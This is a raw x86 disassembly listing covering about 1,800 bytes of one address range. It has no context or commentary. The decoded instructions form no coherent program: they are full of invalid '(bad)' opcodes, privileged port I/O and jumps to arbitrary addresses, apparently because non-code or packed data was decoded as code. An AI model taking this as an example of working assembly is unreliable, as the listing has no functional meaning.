  40a1a8:	iret   
  40a1a9:	icebp  
  40a1aa:	rcr    esp,1
  40a1ac:	es in  ax,dx
  40a1af:	xlat   BYTE PTR ds:[ebx]
  40a1b0:	leave  
  40a1b1:	lods   eax,DWORD PTR ds:[esi]
  40a1b2:	gs stc 
  40a1b4:	fs popf 
  40a1b6:	cmp    DWORD PTR [edx+ebx*1],edi
  40a1b9:	dec    edi
  40a1ba:	cli    
  40a1bb:	xlat   BYTE PTR ds:[ebx]
  40a1bc:	adc    BYTE PTR [ecx+0x5c73c53a],al
  40a1c2:	dec    edx
  40a1c3:	fucomi st,st(5)
  40a1c5:	jb     0x40a23f
  40a1c7:	cmp    DWORD PTR [ebp+0x296c17c5],esi
  40a1cd:	daa    
  40a1ce:	jmp    0x40a192
  40a1d0:	ss scas eax,DWORD PTR es:[edi]
  40a1d2:	sub    dh,BYTE PTR [edi]
  40a1d4:	ss pop ebp
  40a1d6:	push   cs
  40a1d7:	jl     0x40a1f0
  40a1d9:	mov    bl,0x48
  40a1db:	call   0xb2eb3c12
  40a1e0:	mov    ds:0xa2dbad07,eax
  40a1e5:	arpl   si,si
  40a1e7:	fsubr  st(6),st
  40a1e9:	add    ebx,DWORD PTR [ecx-0x47]
  40a1ec:	cmp    al,0x86
  40a1ee:	fwait
  40a1ef:	xchg   edx,eax
  40a1f0:	mov    ch,0xad
  40a1f2:	call   0x854e4343
  40a1f7:	icebp  
  40a1f8:	sbb    ebx,esp
  40a1fa:	push   esp
  40a1fb:	cmp    eax,0xbddee909
  40a200:	add    esp,DWORD PTR [eax+0x27d5ac65]
  40a206:	fdiv   DWORD PTR [ebx-0x74]
  40a209:	jmp    DWORD PTR [edx]
  40a20b:	mov    ds:0x3d9b16fd,al
  40a210:	aas    
  40a211:	stos   BYTE PTR es:[edi],al
  40a212:	(bad)  
  40a213:	and    dh,BYTE PTR [ebx+edx*2]
  40a216:	mov    dl,0x41
  40a218:	bound  edi,QWORD PTR [eax]
  40a21a:	mov    dl,0x34
  40a21c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40a21e:	inc    ebp
  40a21f:	or     eax,0x4450304c
  40a224:	xchg   ebx,eax
  40a225:	ins    DWORD PTR es:[edi],dx
  40a226:	pop    esp
  40a227:	cmp    eax,0xed614cc3
  40a22c:	int    0x47
  40a22e:	xchg   BYTE PTR [esp+ebp*2-0x7826cbfc],dh
  40a235:	dec    eax
  40a236:	(bad)  
  40a237:	daa    
  40a238:	push   0xeefc59c7
  40a23d:	jmp    0x40a257
  40a23f:	mov    bl,0xc8
  40a241:	cmc    
  40a242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a243:	pushf  
  40a244:	retf   0xfb37
  40a247:	(bad)  
  40a248:	cli    
  40a249:	test   eax,0x8720b2a3
  40a24e:	dec    esi
  40a24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a250:	fild   QWORD PTR [eax+0x2e]
  40a253:	jg     0x40a216
  40a255:	cmp    al,0x9f
  40a257:	xchg   ecx,eax
  40a258:	leave  
  40a259:	ins    BYTE PTR es:[edi],dx
  40a25a:	sbb    eax,0xf05f9b0b
  40a25f:	xor    al,0x3a
  40a261:	mov    dl,0x7
  40a263:	repnz test DWORD PTR [ecx],ebx
  40a266:	jo     0x40a20b
  40a268:	(bad)  
  40a269:	pop    ecx
  40a26a:	jo     0x40a209
  40a26c:	mov    fs,WORD PTR ds:0x59c7dc1e
  40a272:	mov    esi,0x36f6602
  40a277:	sub    al,0x9
  40a279:	cli    
  40a27a:	cmp    ebp,DWORD PTR [ebx]
  40a27c:	jg     0x40a2cf
  40a27e:	xor    DWORD PTR [edx+0x5bd016a0],esi
  40a284:	clc    
  40a285:	cwde   
  40a286:	(bad)  
  40a287:	ss inc esp
  40a289:	mov    edi,0xaf732cc6
  40a28e:	add    BYTE PTR [esi-0x50],ch
  40a291:	jo     0x40a2b3
  40a293:	sbb    dh,BYTE PTR [ebx-0x80]
  40a296:	sbb    BYTE PTR [ebx],0x5f
  40a299:	arpl   WORD PTR ds:0x1f125b66,di
  40a29f:	add    DWORD PTR [eax],ebx
  40a2a1:	cwde   
  40a2a2:	stc    
  40a2a3:	pop    eax
  40a2a4:	cmp    ebx,DWORD PTR [ecx-0x71684a99]
  40a2aa:	sub    dh,dl
  40a2ac:	jb     0x40a232
  40a2ae:	and    eax,0x9199dfba
  40a2b3:	add    BYTE PTR [ecx+0x2e18e17d],cl
  40a2b9:	push   edi
  40a2ba:	mov    esi,DWORD PTR [esi-0x17]
  40a2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2be:	dec    eax
  40a2bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2c0:	sub    DWORD PTR [edx],esi
  40a2c2:	jl     0x40a2ba
  40a2c4:	scas   al,BYTE PTR es:[edi]
  40a2c5:	jnp    0x40a2e2
  40a2c7:	and    DWORD PTR [eax+0x20],edx
  40a2ca:	sub    eax,0xb9055cf4
  40a2cf:	jae    0x40a2ff
  40a2d1:	pop    es
  40a2d2:	jge    0x40a292
  40a2d4:	and    DWORD PTR [edi],0x92a4b5b6
  40a2da:	jne    0x40a30a
  40a2dc:	lea    edx,[ebx+0x8]
  40a2df:	(bad)
  40a2e3:	mov    esp,0xf9a85b8f
  40a2e8:	dec    edi
  40a2e9:	dec    esi
  40a2ea:	add    DWORD PTR [ebx+0x60d0581f],esp
  40a2f0:	xchg   BYTE PTR [ecx],cl
  40a2f2:	sbb    al,BYTE PTR [edi+0x471d98d]
  40a2f8:	add    al,0xe0
  40a2fa:	pushf  
  40a2fb:	push   cs
  40a2fc:	leave  
  40a2fd:	enter  0x3e6c,0x68
  40a301:	in     eax,0x28
  40a303:	xor    eax,0xff17c16e
  40a308:	mov    al,0xba
  40a30a:	xchg   BYTE PTR [ebp-0x5dd5e020],bh
  40a310:	int    0x72
  40a312:	fcom   QWORD PTR [esi+0x23]
  40a315:	scas   eax,DWORD PTR es:[edi]
  40a316:	mov    ds:0x463cf688,al
  40a31b:	jae    0x40a38e
  40a31d:	ja     0x40a37d
  40a31f:	mov    esp,0xafb8f508
  40a324:	fdivr  DWORD PTR [eax+0x5b0cedea]
  40a32a:	repnz mov eax,0x14a8d1f4
  40a330:	mov    ds:0x3eae95ea,eax
  40a335:	pop    edx
  40a336:	adc    ch,BYTE PTR [edi+0x726f8a21]
  40a33c:	pop    edx
  40a33d:	into   
  40a33e:	es out dx,al
  40a340:	pop    es
  40a341:	cwde   
  40a342:	and    BYTE PTR [edi],al
  40a344:	sub    BYTE PTR [edx+0x12],0x9e
  40a348:	cmp    eax,0xd4561241
  40a34d:	les    eax,FWORD PTR [ebp+ecx*1+0x256fe69b]
  40a354:	dec    ecx
  40a355:	clc    
  40a356:	cdq    
  40a357:	shl    DWORD PTR [esi+ebx*2-0x4a],1
  40a35b:	test   dh,bl
  40a35d:	shr    ebx,1
  40a35f:	test   eax,0xfd351476
  40a364:	adc    al,dh
  40a366:	add    eax,0x75b17bcd
  40a36b:	ins    DWORD PTR es:[edi],dx
  40a36c:	inc    esi
  40a36d:	inc    edi
  40a36e:	jp     0x40a344
  40a370:	dec    ebp
  40a371:	and    eax,eax
  40a373:	adc    BYTE PTR [eax-0x2e2b69d9],al
  40a379:	mov    eax,0x10f593e1
  40a37e:	jle    0x40a3b2
  40a380:	enter  0xafc9,0x3f
  40a384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a385:	and    al,0x89
  40a387:	sub    eax,0xfc447f9f
  40a38c:	les    ecx,FWORD PTR ds:0x121bb073
  40a392:	adc    al,0x94
  40a394:	(bad)  
  40a395:	mov    dl,0x3b
  40a397:	ins    DWORD PTR es:[edi],dx
  40a398:	fwait
  40a399:	iret   
  40a39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a39b:	lods   al,BYTE PTR ds:[esi]
  40a39c:	popf   
  40a39d:	adc    ebp,DWORD PTR [eax]
  40a39f:	repz push edx
  40a3a1:	ror    DWORD PTR [edx],1
  40a3a3:	(bad)  
  40a3a4:	pushf  
  40a3a5:	out    dx,eax
  40a3a6:	xor    DWORD PTR [edi+0x51fc1dc1],0x3f
  40a3ad:	inc    esp
  40a3ae:	or     eax,0xd2701d16
  40a3b3:	sbb    al,0x65
  40a3b5:	fucomi st,st(0)
  40a3b7:	sub    BYTE PTR [esi+0x4b10ff10],0xa0
  40a3be:	inc    esp
  40a3bf:	xchg   ebp,eax
  40a3c0:	ret    
  40a3c1:	hlt    
  40a3c2:	jl     0x40a3cb
  40a3c4:	scas   eax,DWORD PTR es:[edi]
  40a3c5:	daa    
  40a3c6:	mov    dl,0xbc
  40a3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3c9:	adc    edx,ecx
  40a3cb:	aaa    
  40a3cc:	fwait
  40a3cd:	jmp    0x16fe:0x46219002
  40a3d4:	adc    al,0xaa
  40a3d6:	cmp    ecx,edi
  40a3d8:	pop    ebx
  40a3d9:	imul   esp,DWORD PTR [esi-0x7],0x4e1f2651
  40a3e0:	xor    bl,ah
  40a3e2:	loope  0x40a3bc
  40a3e4:	sti    
  40a3e5:	es lahf 
  40a3e7:	sbb    BYTE PTR [eax-0x55cfa244],bl
  40a3ed:	dec    ecx
  40a3ee:	fstp   st(7)
  40a3f0:	sti    
  40a3f1:	clc    
  40a3f2:	scas   eax,DWORD PTR es:[edi]
  40a3f3:	push   edx
  40a3f4:	std    
  40a3f5:	jne    0x40a440
  40a3f7:	cmp    esi,ecx
  40a3f9:	sar    BYTE PTR [edx+ebx*8],cl
  40a3fc:	(bad)  
  40a3fd:	sub    BYTE PTR [ebp-0x1f],0xe3
  40a401:	ret    0x790b
  40a404:	nop
  40a405:	fcmovb st,st(6)
  40a407:	outs   dx,DWORD PTR ds:[esi]
  40a408:	mov    BYTE PTR [eax-0x66],bh
  40a40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a40c:	(bad)  
  40a40d:	stos   BYTE PTR es:[edi],al
  40a40e:	push   0xfe95e27e
  40a413:	(bad)  
  40a414:	out    0xcd,al
  40a416:	adc    dl,al
  40a418:	ins    DWORD PTR es:[di],dx
  40a41a:	mov    ds:0x9fe838c7,eax
  40a41f:	std    
  40a420:	sub    bh,bh
  40a422:	popf   
  40a423:	nop
  40a424:	idiv   edx
  40a426:	cmp    eax,0xf6fd2ef3
  40a42b:	jge    0x40a498
  40a42d:	dec    esp
  40a42e:	push   ss
  40a42f:	rcr    DWORD PTR fs:[esi],cl
  40a432:	cld    
  40a433:	push   ebx
  40a434:	out    dx,eax
  40a435:	aas    
  40a436:	fisubr DWORD PTR [ebx-0x3c]
  40a439:	cdq    
  40a43a:	das    
  40a43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a43c:	outs   dx,DWORD PTR ds:[esi]
  40a43d:	xchg   esp,eax
  40a43e:	inc    edx
  40a43f:	fwait
  40a440:	or     BYTE PTR [edi+0x143c8517],ah
  40a446:	xchg   esp,eax
  40a447:	adc    ch,BYTE PTR [ebp+0x30]
  40a44a:	ins    BYTE PTR es:[edi],dx
  40a44b:	xchg   esi,eax
  40a44c:	xor    cl,BYTE PTR [ebx-0x17]
  40a44f:	in     eax,dx
  40a450:	or     DWORD PTR [ebx],esi
  40a452:	scas   al,BYTE PTR es:[edi]
  40a453:	shr    BYTE PTR [ecx+0x79],1
  40a456:	imul   eax,esi,0x849997b6
  40a45c:	jne    0x40a458
  40a45e:	jmp    0xf67:0xd14e50a0
  40a465:	(bad)  
  40a466:	xlat   BYTE PTR ds:[ebx]
  40a467:	lods   eax,DWORD PTR ds:[esi]
  40a468:	fadd   QWORD PTR [esi-0x58]
  40a46b:	xor    eax,0x58999842
  40a470:	xchg   ebx,eax
  40a471:	cmp    al,0xe
  40a473:	pop    edx
  40a474:	or     eax,0x56dc887
  40a479:	lods   eax,DWORD PTR ds:[esi]
  40a47a:	xor    DWORD PTR [esi-0x78c07adc],edx
  40a480:	xchg   ebp,eax
  40a481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a482:	ins    BYTE PTR es:[edi],dx
  40a483:	les    edx,FWORD PTR [edi+0x28]
  40a486:	sbb    edx,DWORD PTR [ecx+0x3]
  40a489:	popf   
  40a48a:	std    
  40a48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a48c:	in     al,dx
  40a48d:	add    DWORD PTR [esi-0x574ad048],eax
  40a493:	mov    ah,0x77
  40a495:	push   ebp
  40a496:	dec    ecx
  40a497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a498:	mov    ch,0x30
  40a49a:	fnop   
  40a49c:	fbstp  TBYTE PTR [ebx-0x35]
  40a49f:	ss mov ebx,0x6f5173c
  40a4a5:	call   DWORD PTR [ebp+0x30fe6420]
  40a4ab:	popf   
  40a4ac:	cdq    
  40a4ad:	pop    esp
  40a4ae:	(bad)
  40a4b1:	or     bh,BYTE PTR [edx+0x25834eaa]
  40a4b7:	inc    esp
  40a4b8:	mov    eax,0x4ec6cf71
  40a4bd:	(bad)  
  40a4be:	shl    dh,cl
  40a4c0:	retf   
  40a4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4c2:	out    0xa4,eax
  40a4c4:	cmp    BYTE PTR [edx+0x9d88e40],dh
  40a4ca:	xor    edi,DWORD PTR [esi+0x9]
  40a4cd:	aaa    
  40a4ce:	out    0x2a,eax
  40a4d0:	xor    BYTE PTR [ecx+0x33],cl
  40a4d3:	ds jo  0x40a4d4
  40a4d6:	lds    edi,FWORD PTR [ecx]
  40a4d8:	outs   dx,DWORD PTR ds:[esi]
  40a4d9:	or     ch,ch
  40a4db:	dec    edi
  40a4dc:	fistp  WORD PTR [ebp-0x28]
  40a4df:	dec    eax
  40a4e0:	and    DWORD PTR [ebx-0x236c0edd],esp
  40a4e6:	imul   eax,ecx,0xffffff9d
  40a4e9:	mov    ?,WORD PTR [ecx-0x42190337]
  40a4ef:	in     eax,0x52
  40a4f1:	adc    BYTE PTR [edx+0x304bfe6b],bl
  40a4f7:	xchg   ecx,eax
  40a4f8:	(bad)  
  40a4f9:	popf   
  40a4fa:	fsubrp st(7),st
  40a4fc:	shr    BYTE PTR [esi+0x6d230aa1],0x1a
  40a503:	fcmovbe st,st(5)
  40a505:	push   0x32
  40a507:	push   esp
  40a508:	push   ecx
  40a509:	pusha  
  40a50a:	mov    ah,BYTE PTR [edi]
  40a50c:	xor    BYTE PTR [eax-0x57],ah
  40a50f:	mov    ds:0x1992f57d,al
  40a514:	int3   
  40a515:	sar    DWORD PTR [eax+eiz*4],0xad
  40a519:	xor    dh,dh
  40a51b:	adc    bl,BYTE PTR [edi]
  40a51d:	pushf  
  40a51e:	sti    
  40a51f:	push   ebx
  40a520:	cld    
  40a521:	outs   dx,DWORD PTR ds:[esi]
  40a522:	xchg   esp,eax
  40a523:	cmp    al,0xe2
  40a525:	pop    esp
  40a526:	and    eax,0xbb14eef0
  40a52b:	mov    ecx,0x2989d235
  40a530:	ror    DWORD PTR [esi+0x31],0xf7
  40a534:	mov    esp,0x64662b77
  40a539:	daa    
  40a53a:	(bad)  
  40a53b:	jle    0x40a57e
  40a53d:	retf   0x34c5
  40a540:	xlat   BYTE PTR ds:[ebx]
  40a541:	jnp    0x40a572
  40a543:	(bad)  
  40a544:	ja     0x40a50b
  40a546:	sub    eax,0xd39436e5
  40a54b:	dec    ebx
  40a54c:	cwde   
  40a54d:	inc    edx
  40a54e:	pop    ebp
  40a54f:	popa   
  40a550:	int3   
  40a551:	or     al,0xd3
  40a553:	stos   BYTE PTR es:[edi],al
  40a554:	out    dx,eax
  40a555:	inc    ecx
  40a556:	cmp    al,0x41
  40a558:	jbe    0x40a5b2
  40a55a:	dec    ecx
  40a55b:	mov    edx,DWORD PTR [esi-0x607f1f9a]
  40a561:	add    BYTE PTR ds:0xe2ed7339,0x19
  40a568:	(bad)  
  40a569:	and    eax,0xe2afa241
  40a56e:	pop    eax
  40a56f:	fsubp  st(7),st
  40a571:	or     DWORD PTR [esi-0x73],esp
  40a574:	ins    DWORD PTR es:[edi],dx
  40a575:	(bad)  
  40a576:	shr    BYTE PTR [edi-0x6d0cb18a],0xd3
  40a57d:	fidivr DWORD PTR [ecx+0x77]
  40a580:	xlat   BYTE PTR ds:[ebx]
  40a581:	add    al,0x60
  40a583:	pop    eax
  40a584:	push   ebp
  40a585:	stc    
  40a586:	dec    eax
  40a587:	neg    DWORD PTR [edi-0x75]
  40a58a:	cmp    al,0x1
  40a58c:	fcomp  QWORD PTR [ecx-0x29e49450]
  40a592:	ins    DWORD PTR es:[edi],dx
  40a593:	in     eax,dx
  40a594:	jp     0x40a601
  40a596:	in     al,0x65
  40a598:	test   DWORD PTR [ebx],ecx
  40a59a:	or     esp,DWORD PTR [edi+0x4a8b07af]
  40a5a0:	es push esi
  40a5a2:	sub    DWORD PTR [di-0x5de0],esp
  40a5a7:	and    DWORD PTR [edx+0x16],ebp
  40a5aa:	pop    ds
  40a5ab:	and    ch,BYTE PTR [ebx]
  40a5ad:	push   0xc
  40a5af:	icebp  
  40a5b0:	aaa    
  40a5b1:	in     al,0x77
  40a5b3:	dec    ebp
  40a5b4:	popa   
  40a5b5:	jp     0x40a5af
  40a5b7:	daa    
  40a5b8:	mov    bh,0x8d
  40a5ba:	test   al,0xdc
  40a5bc:	sbb    esi,edx
  40a5be:	jae    0x40a569
  40a5c0:	xor    eax,0x26c6faab
  40a5c5:	pop    ebx
  40a5c6:	aam    0xcc
  40a5c8:	and    eax,ebx
  40a5ca:	cmp    al,BYTE PTR [edi-0x30]
  40a5cd:	cmp    bl,ah
  40a5cf:	out    0x9e,eax
  40a5d1:	and    dh,BYTE PTR [edi]
  40a5d3:	fadd   QWORD PTR [esi+0x44]
  40a5d6:	pop    ebx
  40a5d7:	xor    ch,BYTE PTR [ebx-0x75]
  40a5da:	loope  0x40a5b3
  40a5dc:	cmovle ecx,DWORD PTR [ecx]
  40a5df:	adc    BYTE PTR ds:0x26e8442f,bl
  40a5e5:	cli    
  40a5e6:	(bad)  
  40a5e7:	mov    eax,ds:0xd9a9ea00
  40a5ec:	xor    bh,BYTE PTR [edx+eiz*8]
  40a5ef:	xchg   esp,eax
  40a5f0:	pop    es
  40a5f1:	loope  0x40a641
  40a5f3:	stc    
  40a5f4:	dec    edi
  40a5f5:	in     al,0x8f
  40a5f7:	nop
  40a5f8:	or     DWORD PTR [esi-0x54],edi
  40a5fb:	push   es
  40a5fc:	dec    ebp
  40a5fd:	repnz xchg esp,eax
  40a5ff:	mov    esp,DWORD PTR [edi-0x5]
  40a602:	push   eax
  40a603:	adc    dh,ah
  40a605:	jmp    0xc58da634
  40a60a:	out    0xb1,al
  40a60c:	add    ebx,esi
  40a60e:	aaa    
  40a60f:	lock fnstcw WORD PTR [edx-0x43]
  40a613:	and    al,0x8d
  40a615:	pushf  
  40a616:	add    bl,BYTE PTR [edx-0x6a1d3ac1]
  40a61c:	ins    DWORD PTR es:[edi],dx
  40a61d:	inc    BYTE PTR [ebx-0x2779812a]
  40a623:	gs xchg esp,eax
  40a625:	leave  
  40a626:	mov    esp,0xbdf28936
  40a62b:	adc    al,0x2e
  40a62d:	ror    DWORD PTR [ebp-0x47],cl
  40a630:	pop    eax
  40a631:	xor    BYTE PTR [ecx+ebp*4-0x22],bl
  40a635:	ror    BYTE PTR [ebp-0x36],0x6c
  40a639:	clc    
  40a63a:	imul   ecx,DWORD PTR [eax+0x76],0xc83d151b
  40a641:	push   esp
  40a642:	ror    BYTE PTR [edx],1
  40a644:	fild   QWORD PTR [edx]
  40a646:	out    dx,al
  40a647:	pop    esi
  40a648:	test   BYTE PTR [esi-0x8],dl
  40a64b:	mov    ecx,0x309dce47
  40a650:	adc    esp,DWORD PTR [edx]
  40a652:	test   BYTE PTR [ebp-0x1a],bl
  40a655:	sub    dh,BYTE PTR [ebp+ecx*4+0x1ea4962d]
  40a65c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a65d:	test   BYTE PTR [edx-0x5b42f5da],dh
  40a663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a664:	repz or DWORD PTR ds:0x6e80654a,0xffffffde
  40a66c:	in     eax,0x9b
  40a66e:	leave  
  40a66f:	push   ds
  40a670:	cs inc ecx
  40a672:	out    0x6,al
  40a674:	outs   dx,BYTE PTR ds:[esi]
  40a675:	jne    0x40a66d
  40a677:	shr    BYTE PTR [ecx-0x4a],1
  40a67a:	ins    DWORD PTR es:[edi],dx
  40a67b:	jne    0x40a6d4
  40a67d:	cmp    DWORD PTR ds:0xe96311a2,esp
  40a683:	adc    DWORD PTR ds:0x679a95da,ebx
  40a689:	push   es
  40a68a:	or     DWORD PTR [eax+ebp*1],ebx
  40a68d:	inc    ecx
  40a68e:	out    0x3d,eax
  40a690:	and    ebp,DWORD PTR [ecx]
  40a692:	fild   DWORD PTR [edi+0xf4634f7]
  40a698:	push   ebx
  40a699:	(bad)  
  40a69a:	cmp    esp,DWORD PTR [eax+0x6cf444b1]
  40a6a0:	or     dl,dl
  40a6a2:	xor    BYTE PTR [edi+0x20],dl
  40a6a5:	and    BYTE PTR [ecx-0x4fba78cb],bl
  40a6ab:	or     DWORD PTR [ebp+0x4b],0x923f9685
  40a6b2:	and    DWORD PTR [edi-0x59db90c7],0xffffffd7
  40a6b9:	mov    ds:0x8d420d6d,eax
  40a6be:	jbe    0x40a645
  40a6c0:	call   0xb0716e64
  40a6c5:	sub    al,0x6c
  40a6c7:	fwait
  40a6c8:	xchg   edi,eax
  40a6c9:	pop    edi
  40a6ca:	xor    dh,ah
  40a6cc:	cwde   
  40a6cd:	test   eax,0xfc31e3ab
  40a6d2:	loop   0x40a6e2
  40a6d4:	add    edi,DWORD PTR [ebp-0x7a]
  40a6d7:	stos   BYTE PTR es:[edi],al
  40a6d8:	js     0x40a759
  40a6da:	out    0x20,eax
  40a6dc:	xchg   ebp,eax
  40a6dd:	xor    al,0xeb
  40a6df:	retf   0x3379
  40a6e2:	jne    0x40a6fc
  40a6e4:	pop    ds
  40a6e5:	lahf   
  40a6e6:	loopne 0x40a686
  40a6e8:	mov    ah,0xbf
  40a6ea:	aaa    
  40a6eb:	push   eax
  40a6ec:	test   DWORD PTR [edx-0x5d254170],edx
  40a6f2:	stos   DWORD PTR es:[edi],eax
  40a6f3:	es pop ss
  40a6f5:	adc    al,0xd
  40a6f7:	in     eax,0x11
  40a6f9:	sbb    DWORD PTR [esi],ebx
  40a6fb:	mov    ebx,0x161fe10a
  40a700:	sbb    ebx,DWORD PTR [eax-0x37404163]
  40a706:	add    dl,ch
  40a708:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40a70a:	es das 
  40a70c:	and    al,0x9e
  40a70e:	sahf   
  40a70f:	push   ebx
  40a710:	mov    eax,0xf7c84e95
  40a715:	dec    edi
  40a716:	dec    esi
  40a717:	xor    al,0x5b
  40a719:	add    al,0xf5
  40a71b:	arpl   si,cx
  40a71d:	inc    ebp
  40a71e:	add    dh,BYTE PTR [ebx]
  40a720:	push   0xfffffff9
  40a722:	mov    ebp,0x3707f1ae
  40a727:	scas   al,BYTE PTR es:[edi]
  40a728:	enter  0x3bc,0x21
  40a72c:	out    dx,al
  40a72d:	mov    dl,0xd7
  40a72f:	(bad)  
  40a730:	(bad)  [eax-0x20]
  40a733:	lea    ecx,[eax+0x63d9b8af]
  40a739:	cwde   
  40a73a:	gs repnz test bl,al
  40a73e:	bound  ecx,QWORD PTR [edi+0x4e148383]
  40a744:	jp     0x40a734
  40a746:	cmp    al,0x88
  40a748:	xchg   DWORD PTR [ebp-0x7],ebx
  40a74b:	bound  edi,QWORD PTR [edx+ebp*2]
  40a74e:	nop
  40a74f:	js     0x40a6fd
  40a751:	scas   eax,DWORD PTR es:[edi]
  40a752:	cmp    BYTE PTR [ecx+ecx*1+0x7ba42fc9],0x98
  40a75a:	jmp    0x40a710
  40a75c:	push   esp
  40a75d:	cmc    
  40a75e:	aam    0xe3
  40a760:	adc    bl,BYTE PTR [ebp-0x66]
  40a763:	add    DWORD PTR [ecx],ebx
  40a765:	cmp    ah,BYTE PTR [edi+0x2d]
  40a768:	stos   BYTE PTR es:[edi],al
  40a769:	fild   DWORD PTR [eax+eiz*8-0x5b]
  40a76d:	xor    BYTE PTR [ebx],0xe7
  40a770:	xchg   ecx,eax
  40a771:	adc    eax,ebx
  40a773:	data16 mov dl,0x50
  40a776:	add    eax,0xe942e8a9
  40a77b:	es xchg ebx,eax
  40a77d:	jne    0x40a74e
  40a77f:	lahf   
  40a780:	das    
  40a781:	(bad)  
  40a782:	sti    
  40a783:	jl     0x40a7ed
  40a785:	or     BYTE PTR [eax+0x68ff2661],ch
  40a78b:	adc    eax,0x20621105
  40a790:	(bad)  
  40a791:	int    0xb3
  40a793:	or     DWORD PTR [eax-0x7f],edi
  40a796:	dec    edi
  40a797:	jne    0x40a811
  40a799:	cwde   
  40a79a:	fdivr  DWORD PTR [eax]
  40a79c:	and    ecx,ebp
  40a79e:	sbb    DWORD PTR [ecx-0x461bcb3d],ecx
  40a7a4:	loope  0x40a79f
  40a7a6:	call   0xd063:0x7e018ad6
  40a7ad:	sbb    BYTE PTR [esi],bl
  40a7af:	jg     0x40a77a
  40a7b1:	outs   dx,DWORD PTR ds:[esi]
  40a7b2:	mov    ebx,0xc5915905
  40a7b7:	dec    ebx
  40a7b8:	out    dx,al
  40a7b9:	jne    0x40a7a4
  40a7bb:	dec    ebx
  40a7bc:	pop    ebp
  40a7bd:	int    0xa3
  40a7bf:	mov    DWORD PTR [eax+edx*8+0x3e],esp
  40a7c3:	icebp  
  40a7c4:	cmp    al,0x8c
  40a7c6:	jmp    0xf34d:0x66a8bb61
  40a7cd:	sub    edi,DWORD PTR [ebx]
  40a7cf:	or     eax,ebx
  40a7d1:	xchg   esp,eax
  40a7d2:	mov    eax,0x42274b0e
  40a7d7:	or     eax,0xc1527e5d
  40a7dc:	sub    bh,cl
  40a7de:	outs   dx,BYTE PTR ds:[esi]
  40a7df:	cli    
  40a7e0:	pop    ss
  40a7e1:	icebp  
  40a7e2:	into   
  40a7e3:	xor    al,0xbb
  40a7e5:	cmp    BYTE PTR [edi+0x3f],ch
  40a7e8:	(bad)  
  40a7e9:	std    
  40a7ea:	cmp    ah,BYTE PTR [edi]
  40a7ec:	enter  0x6ed9,0x91
  40a7f0:	fadd   st(7),st
  40a7f2:	lds    ecx,FWORD PTR [edx-0x5e]
  40a7f5:	xchg   edx,eax
  40a7f6:	jge    0x40a7c3
  40a7f8:	js     0x40a80e
  40a7fa:	adc    BYTE PTR [ebx-0x48ba18f0],bl
  40a800:	pop    ebx
  40a801:	js     0x40a7f4
  40a803:	xchg   esi,eax
  40a804:	mov    BYTE PTR [eax+edx*1],dl
  40a807:	pop    eax
  40a808:	fstp   QWORD PTR [esi+edx*4+0x64fc6e53]
  40a80f:	(bad)  
  40a810:	mov    esi,0x73b19635
  40a815:	stos   BYTE PTR es:[edi],al
  40a816:	ja     0x40a843
  40a818:	fs mov bh,0x60
  40a81b:	adc    al,0xe6
  40a81d:	nop
  40a81e:	scas   eax,DWORD PTR es:[edi]
  40a81f:	dec    eax
  40a820:	add    DWORD PTR [edx+ebx*1-0x610a8d50],ecx
  40a827:	and    al,BYTE PTR [edi+ebx*4+0x9f12704]
  40a82e:	jb     0x40a896
  40a830:	mov    eax,ds:0xa4e60aa6
  40a835:	xor    dl,BYTE PTR [ebx]
  40a837:	ror    BYTE PTR ss:[ebp+0x18b98c44],cl
  40a83e:	inc    edx
  40a83f:	sbb    dl,BYTE PTR [ecx]
  40a841:	int3   
  40a842:	cmp    dh,dh
  40a844:	stos   DWORD PTR es:[edi],eax
  40a845:	mov    ch,0x3a
  40a847:	cld    
  40a848:	ss dec esp
  40a84a:	push   es
  40a84b:	addr16 in eax,0xda
  40a84e:	imul   esp,ebp,0xf7ed6416
  40a854:	xchg   esp,eax
  40a855:	sbb    DWORD PTR [edx+ebp*8+0x7fc0d4ba],ebp
  40a85c:	pop    ecx
  40a85d:	iret   
  40a85e:	cmp    al,0x2c
  40a860:	xor    ecx,DWORD PTR [ebx+0x290da43f]
  40a866:	mov    ecx,0xc77a0e4a
  40a86b:	call   0xad19:0xafe221b1
  40a872:	xor    eax,0xe79d4936
  40a877:	in     al,dx
  40a878:	add    bh,dl
  40a87a:	jecxz  0x40a8f0
  40a87c:	inc    ecx
  40a87d:	pusha  
  40a87e:	mov    bl,0x39
  40a880:	scas   eax,DWORD PTR es:[edi]
  40a881:	push   ebp
  40a882:	cmp    esp,DWORD PTR [esi+ecx*4]
  40a885:	push   esp
  40a886:	test   BYTE PTR [eax-0x20386c20],dl
  40a88c:	mov    al,ds:0x40f18413
  40a891:	gs repnz push ebx
  40a894:	inc    edx
  40a895:	lods   al,BYTE PTR ds:[esi]
  40a896:	loopne 0x40a86f
  40a898:	shl    BYTE PTR ds:0xe694f9fa,cl
  40a89e:	fldenv [eax+0x53]
  40a8a1:	or     al,0x69
  40a8a3:	out    0xce,al
  40a8a5:	loopne 0x40a882
  40a8a7:	and    dh,0xbc
  40a8aa:	inc    ebp
  40a8ab:	and    DWORD PTR [ecx-0x5b],0xffffffee
  40a8af:	mov    bl,0xe8
  40a8b1:	aaa    
  40a8b2:	or     DWORD PTR [ecx],ebx
  40a8b4:	sbb    eax,0xe73a3351
  40a8b9:	repnz loop 0x40a845
  40a8bc:	cmp    eax,0x5a03de2a
  40a8c1:	les    esp,FWORD PTR [eax]
  40a8c3:	jo     0x40a92c
  40a8c5:	hlt    
  40a8c6:	pusha  
